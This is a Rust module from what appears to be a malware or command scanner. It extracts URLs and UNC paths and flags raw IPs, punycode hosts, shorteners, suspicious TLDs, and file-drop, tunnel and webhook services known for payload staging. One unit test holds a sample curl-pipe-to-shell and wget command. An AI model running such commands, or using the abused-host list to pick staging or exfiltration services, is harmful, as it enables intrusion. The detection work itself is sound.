//! URL extraction and host classification.

use crate::sig;

/// Domain endings disproportionately used by throwaway malware sites.
/// Only ever used to *escalate* other findings, never alone.
const SUSPICIOUS_TLDS: &[&str] = &[
    "accountant",
    "autos",
    "bar",
    "beauty",
    "bid",
    "boats",
    "bond",
    "buzz",
    "cam",
    "cf",
    "cfd",
    "click",
    "country",
    "cricket",
    "cyou",
    "date",
    "download",
    "faith",
    "ga",
    "gq",
    "hair",
    "homes",
    "icu",
    "kim",
    "lat",
    "loan",
    "lol",
    "makeup",
    "men",
    "ml",
    "mom",
    "monster",
    "mov",
    "party",
    "pics",
    "pw",
    "quest",
    "racing",
    "rest",
    "review",
    "sbs",
    "science",
    "shop",
    "skin",
    "stream",
    "su",
    "tk",
    "top",
    "trade",
    "uno",
    "webcam",
    "win",
    "work",
    "xyz",
    "yachts",
    "zip",
];

const SHORTENERS: &[&str] = &[
    "bit.ly",
    "bitly.com",
    "cutt.ly",
    "goo.su",
    "is.gd",
    "ow.ly",
    "rb.gy",
    "rebrand.ly",
    "s.gy",
    "short.gy",
    "shorturl.at",
    "t.co",
    "t.ly",
    "tiny.cc",
    "tinyurl.com",
    "v.gd",
    "buff.ly",
    "lnkd.in",
    "qrco.de",
];

/// File drops, tunnels and script hosts frequently used to stage payloads.
/// Matched as exact host or as a parent domain.
const ABUSED_HOSTS: &[&str] = &[
    "0x0.st",
    "anonfiles.com",
    "api.telegram.org",
    "bashupload.com",
    "bore.pub",
    "catbox.moe",
    "cdn.discordapp.com",
    "ddns.net",
    "dl.dropboxusercontent.com",
    "duckdns.org",
    "file.io",
    "filebin.net",
    "files.fm",
    "glitch.me",
    "gofile.io",
    "hopto.org",
    "ipfs.io",
    "dweb.link",
    "loca.lt",
    "localhost.run",
    "mediafire.com",
    "ngrok-free.app",
    "ngrok.app",
    "ngrok.io",
    "oshi.at",
    "paste.ee",
    "pastebin.com",
    "pipedream.net",
    "serveo.net",
    "telegra.ph",
    "temp.sh",
    "tmpfiles.org",
    "transfer.sh",
    "trycloudflare.com",
    "webhook.site",
    "workers.dev",
    "zapto.org",
];

/// Extract URLs (http, https, ftp, UNC paths) from text.
pub fn extract(text: &str, out: &mut Vec<String>) {
    let lower_has = |needle: &str| {
        text.len() >= needle.len()
            && text
                .as_bytes()
                .windows(needle.len())
                .any(|w| w.eq_ignore_ascii_case(needle.as_bytes()))
    };
    if !lower_has("://") && !text.contains("\\\\") {
        return;
    }
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let rest = &text[i..];
        let scheme_len = ["https://", "http://", "ftp://", "ftps://"]
            .iter()
            .find(|s| {
                rest.len() >= s.len()
                    && rest.as_bytes()[..s.len()].eq_ignore_ascii_case(s.as_bytes())
            })
            .map(|s| s.len());
        if let Some(sl) = scheme_len {
            let end = rest[sl..]
                .find(|c: char| c.is_whitespace() || "'\"`()<>;|,{}[]\\^\u{1}".contains(c))
                .map_or(rest.len(), |e| e + sl);
            let url = rest[..end].trim_end_matches(['.', ':']);
            if url.len() > sl && !out.iter().any(|u| u == url) {
                out.push(url.to_string());
            }
            i += end.max(1);
            continue;
        }
        // UNC path \\host\share (used with rundll32 / WebDAV tricks).
        if rest.starts_with("\\\\") && (i == 0 || !bytes[i - 1].is_ascii_alphanumeric()) {
            let host_end = rest[2..]
                .find(|c: char| c == '\\' || c.is_whitespace() || "'\"`;|".contains(c))
                .map_or(rest.len(), |e| e + 2);
            let host = &rest[2..host_end];
            if host.contains('.') || host.contains('@') {
                let u = format!("unc://{host}");
                if !out.contains(&u) {
                    out.push(u);
                }
            }
            i += host_end.max(2);
            continue;
        }
        i += rest.chars().next().map_or(1, |c| c.len_utf8());
    }
}

/// Host part of a URL, lowercased, without credentials or port.
pub fn host(url: &str) -> Option<String> {
    let after = url.split_once("://")?.1;
    let authority = after.split(['/', '?', '#']).next()?;
    let authority = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    let h = if let Some(rest) = authority.strip_prefix('[') {
        rest.split(']').next()?.to_string()
    } else {
        authority.split(':').next()?.to_string()
    };
    let h = h.trim_end_matches('.').to_lowercase();
    (!h.is_empty()).then_some(h)
}

/// Origin (`scheme://host[:port]`) of a URL, lowercased.
pub fn origin(url: &str) -> Option<String> {
    let (scheme, after) = url.split_once("://")?;
    let authority = after.split(['/', '?', '#']).next()?;
    let authority = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    Some(format!(
        "{}://{}",
        scheme.to_lowercase(),
        authority.to_lowercase()
    ))
}

/// True if `url` matches an allowlist entry (origin or bare host).
pub fn origin_allowed(url: &str, allow: &[&str]) -> bool {
    let (Some(o), Some(h)) = (origin(url), host(url)) else {
        return false;
    };
    allow.iter().any(|a| {
        let a = a.trim().trim_end_matches('/').to_lowercase();
        if a.contains("://") {
            a == o
        } else {
            a == h
        }
    })
}

fn parse_ipv4(h: &str) -> Option<[u8; 4]> {
    let mut parts = [0u8; 4];
    let mut n = 0;
    for p in h.split('.') {
        if n == 4 || p.is_empty() || p.len() > 3 || !p.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        parts[n] = p.parse().ok()?;
        n += 1;
    }
    (n == 4).then_some(parts)
}

fn is_private_v4(ip: [u8; 4]) -> bool {
    matches!(
        ip,
        [10, ..] | [127, ..] | [0, ..] | [169, 254, ..] | [192, 168, ..]
    ) || (ip[0] == 172 && (16..=31).contains(&ip[1]))
        || (ip[0] == 100 && (64..=127).contains(&ip[1]))
}

/// True if the host is local/private (LAN addresses, localhost).
pub fn is_local(h: &str) -> bool {
    if h == "localhost"
        || h.ends_with(".localhost")
        || h.ends_with(".local")
        || h.ends_with(".lan")
        || h.ends_with(".internal")
    {
        return true;
    }
    if let Some(ip) = parse_ipv4(h) {
        return is_private_v4(ip);
    }
    h == "::1" || h.starts_with("fe80:") || h.starts_with("fc") || h.starts_with("fd")
}

/// Signals raised by a host.
pub fn classify(h: &str) -> u64 {
    let mut s = 0;
    if let Some(ip) = parse_ipv4(h) {
        if !is_private_v4(ip) {
            s |= sig::RAW_IP_URL;
        }
        return s;
    }
    if h.contains(':') {
        if !is_local(h) {
            s |= sig::RAW_IP_URL;
        }
        return s;
    }
    // Decimal/hex IP tricks like http://3232235777 or http://0x7f000001
    if h.bytes().all(|b| b.is_ascii_digit())
        || (h.starts_with("0x") && h[2..].bytes().all(|b| b.is_ascii_hexdigit()))
    {
        return sig::RAW_IP_URL | sig::OBFUSCATION;
    }
    if !h.is_ascii() || h.split('.').any(|l| l.starts_with("xn--")) {
        s |= sig::PUNYCODE_HOST;
    }
    if let Some(tld) = h.rsplit('.').next() {
        if SUSPICIOUS_TLDS.contains(&tld) {
            s |= sig::SUSPICIOUS_TLD;
        }
    }
    if SHORTENERS.contains(&h) {
        s |= sig::URL_SHORTENER;
    }
    if ABUSED_HOSTS.iter().any(|a| {
        h == *a
            || (h.len() > a.len() && h.ends_with(a) && h.as_bytes()[h.len() - a.len() - 1] == b'.')
    }) {
        s |= sig::ABUSED_HOST;
    }
    s
}

/// Extra signals that depend on the full URL (path), not just the host.
pub fn classify_url(url: &str) -> u64 {
    let l = url.to_ascii_lowercase();
    let mut s = 0;
    // Google Apps Script web apps are a popular free beacon/C2 endpoint.
    if l.contains("script.google.com/macros/") || l.contains("discord.com/api/webhooks") {
        s |= sig::ABUSED_HOST;
    }
    if l.contains("pastebin.com/raw")
        || l.contains("gist.githubusercontent.com") && l.contains("/raw/")
    {
        s |= sig::ABUSED_HOST;
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_urls() {
        let mut v = Vec::new();
        extract(
            "curl -fsSL 'https://A.example/x?y=1' | sh; wget http://198.51.100.2:8080/a",
            &mut v,
        );
        assert_eq!(v, ["https://A.example/x?y=1", "http://198.51.100.2:8080/a"]);
        assert_eq!(host(&v[0]).unwrap(), "a.example");
        assert_eq!(host(&v[1]).unwrap(), "198.51.100.2");
    }

    #[test]
    fn classifies_hosts() {
        assert_ne!(classify("198.51.100.2") & sig::RAW_IP_URL, 0);
        assert_eq!(classify("192.168.1.1") & sig::RAW_IP_URL, 0);
        assert_ne!(classify("pp-fixture-1.lat") & sig::SUSPICIOUS_TLD, 0);
        assert_ne!(classify("bit.ly") & sig::URL_SHORTENER, 0);
        assert_ne!(classify("abc.trycloudflare.com") & sig::ABUSED_HOST, 0);
        assert_ne!(classify("xn--pple-43d.com") & sig::PUNYCODE_HOST, 0);
        assert_eq!(classify("sh.rustup.rs"), 0);
        assert_eq!(classify("github.com"), 0);
    }

    #[test]
    fn allowlist() {
        assert!(origin_allowed(
            "https://sh.rustup.rs/x",
            &["https://sh.rustup.rs"]
        ));
        assert!(origin_allowed("https://sh.rustup.rs/x", &["sh.rustup.rs"]));
        assert!(!origin_allowed(
            "https://sh.rustup.rs.evil.example/x",
            &["sh.rustup.rs"]
        ));
        assert!(!origin_allowed(
            "http://sh.rustup.rs/x",
            &["https://sh.rustup.rs"]
        ));
    }
}
